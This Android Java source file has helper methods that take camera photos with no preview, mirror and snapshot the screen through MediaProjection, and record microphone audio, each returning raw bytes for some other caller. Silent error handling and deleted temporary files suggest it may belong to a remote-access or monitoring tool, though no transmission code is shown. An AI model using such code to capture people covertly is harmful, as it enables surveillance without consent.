package com.zeko.droid;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/** Camera2 / MediaProjection / Microphone. */
public final class Media {

    // ─────────────────────── camera ───────────────────────
    public static byte[] cameraShot(Context ctx, int lensFacing, int quality) {
        HandlerThread ht = new HandlerThread("zk-cam");
        ht.start();
        Handler handler = new Handler(ht.getLooper());
        final CountDownLatch done = new CountDownLatch(1);
        final byte[][] result = new byte[1][];
        CameraDevice[] deviceRef = new CameraDevice[1];
        ImageReader[] readerRef = new ImageReader[1];

        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String cameraId = pickCamera(cm, lensFacing);
            if (cameraId == null) return null;

            android.util.Size size = pickSize(cm, cameraId);
            ImageReader reader = ImageReader.newInstance(size.getWidth(), size.getHeight(),
                    ImageFormatConstants.JPEG, 2);
            readerRef[0] = reader;

            reader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireNextImage();
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] jpg = new byte[buf.remaining()];
                    buf.get(jpg);
                    result[0] = jpg;
                } catch (Throwable ignored) {
                } finally {
                    if (img != null) img.close();
                    done.countDown();
                }
            }, handler);

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) {
                    deviceRef[0] = d;
                    try {
                        d.createCaptureSession(Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession s) {
                                        try {
                                            CaptureRequest.Builder b = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            b.addTarget(reader.getSurface());
                                            b.set(CaptureRequest.JPEG_QUALITY, (byte) quality);
                                            b.set(CaptureRequest.CONTROL_AF_MODE,
                                                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                            s.capture(b.build(), null, handler);
                                        } catch (Throwable t) {
                                            done.countDown();
                                        }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession s) { done.countDown(); }
                                }, handler);
                    } catch (Throwable t) { done.countDown(); }
                }
                @Override public void onDisconnected(CameraDevice d) { done.countDown(); }
                @Override public void onError(CameraDevice d, int error) { done.countDown(); }
            }, handler);

            done.await(8, TimeUnit.SECONDS);
            return result[0];
        } catch (Throwable t) {
            return null;
        } finally {
            try { if (deviceRef[0] != null) deviceRef[0].close(); } catch (Throwable ignored) { }
            try { if (readerRef[0] != null) readerRef[0].close(); } catch (Throwable ignored) { }
            try { ht.quitSafely(); } catch (Throwable ignored) { }
        }
    }

    public static String[] cameraList(Context ctx) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            return cm.getCameraIdList();
        } catch (Throwable t) {
            return new String[0];
        }
    }

    private static String pickCamera(CameraManager cm, int lensFacing) throws Exception {
        String fallback = null;
        for (String id : cm.getCameraIdList()) {
            CameraCharacteristics ch = cm.getCameraCharacteristics(id);
            Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
            if (fallback == null) fallback = id;
            if (facing != null && facing == lensFacing) return id;
        }
        return fallback;
    }

    private static android.util.Size pickSize(CameraManager cm, String id) throws Exception {
        CameraCharacteristics ch = cm.getCameraCharacteristics(id);
        android.util.Size[] sizes = null;
        try {
            android.hardware.camera2.params.StreamConfigurationMap map =
                    ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map != null) sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG);
        } catch (Throwable ignored) { }
        if (sizes == null || sizes.length == 0) return new android.util.Size(1280, 720);
        // ưu tiên cái lớn nhất nhưng <= 1280x720; không có thì cái nhỏ nhất
        android.util.Size cand = null;
        for (android.util.Size s : sizes) {
            long area = (long) s.getWidth() * s.getHeight();
            if (area <= 1280L * 720) {
                if (cand == null || area > (long) cand.getWidth() * cand.getHeight()) cand = s;
            }
        }
        if (cand != null) return cand;
        android.util.Size smallest = sizes[0];
        for (android.util.Size s : sizes) {
            if ((long) s.getWidth() * s.getHeight() < (long) smallest.getWidth() * smallest.getHeight())
                smallest = s;
        }
        return smallest;
    }

    private static final class ImageFormatConstants {
        static final int JPEG = android.graphics.ImageFormat.JPEG;
    }

    // ─────────────────────── screen (MediaProjection) ───────────────────────
    public static volatile MediaProjection projection;
    private static ImageReader screenReader;
    private static VirtualDisplay screenDisplay;
    private static volatile long lastStamp;
    private static volatile Bitmap lastBitmap;

    public static void startScreen(Context ctx) {
        try {
            if (projection == null) return;
            if (screenDisplay != null) return;

            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            int w = dm.widthPixels, h = dm.heightPixels, dpi = dm.densityDpi;

            screenReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
            screenReader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireNextImage();
                    Image.Plane p = img.getPlanes()[0];
                    ByteBuffer buf = p.getBuffer();
                    int pixelStride = p.getPixelStride();
                    int rowStride = p.getRowStride();
                    int rowPadding = rowStride - pixelStride * w;

                    Bitmap bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888);
                    bmp.copyPixelsFromBuffer(buf);
                    Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
                    lastBitmap = cropped;
                    lastStamp = System.currentTimeMillis();
                    if (bmp != cropped) bmp.recycle();
                } catch (Throwable ignored) {
                } finally {
                    if (img != null) img.close();
                }
            }, null);

            screenDisplay = projection.createVirtualDisplay("zk-screen", w, h, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    screenReader.getSurface(), null, null);
        } catch (Throwable ignored) { }
    }

    public static byte[] screenShot(int quality, int timeoutMs) {
        try {
            if (screenDisplay == null) return null;
            long want = lastStamp + 1;
            long end = System.currentTimeMillis() + timeoutMs;
            while (System.currentTimeMillis() < end) {
                if (lastStamp >= want && lastBitmap != null) {
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    lastBitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos);
                    return bos.toByteArray();
                }
                Thread.sleep(40);
            }
            if (lastBitmap != null) {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                lastBitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos);
                return bos.toByteArray();
            }
        } catch (Throwable ignored) { }
        return null;
    }

    public static void stopScreen() {
        try { if (screenDisplay != null) screenDisplay.release(); } catch (Throwable ignored) { }
        screenDisplay = null;
        try { if (screenReader != null) screenReader.close(); } catch (Throwable ignored) { }
        screenReader = null;
        lastBitmap = null;
    }

    // ─────────────────────── microphone ───────────────────────
    public static byte[] recordAudio(Context ctx, int seconds) {
        File out = new File(ctx.getCacheDir(), "zk_" + System.currentTimeMillis() + ".m4a");
        MediaRecorder rec = null;
        try {
            rec = new MediaRecorder();
            rec.setAudioSource(MediaRecorder.AudioSource.MIC);
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            rec.setAudioEncodingBitRate(64000);
            rec.setAudioSamplingRate(22050);
            rec.setOutputFile(out.getAbsolutePath());
            rec.prepare();
            rec.start();
            Thread.sleep(Math.max(1, Math.min(seconds, 60)) * 1000L);
            rec.stop();
            rec.release();
            rec = null;

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (FileInputStream fis = new FileInputStream(out)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
            }
            return bos.toByteArray();
        } catch (Throwable t) {
            return null;
        } finally {
            if (rec != null) { try { rec.release(); } catch (Throwable ignored) { } }
            //noinspection ResultOfMethodCallIgnored
            out.delete();
        }
    }
}
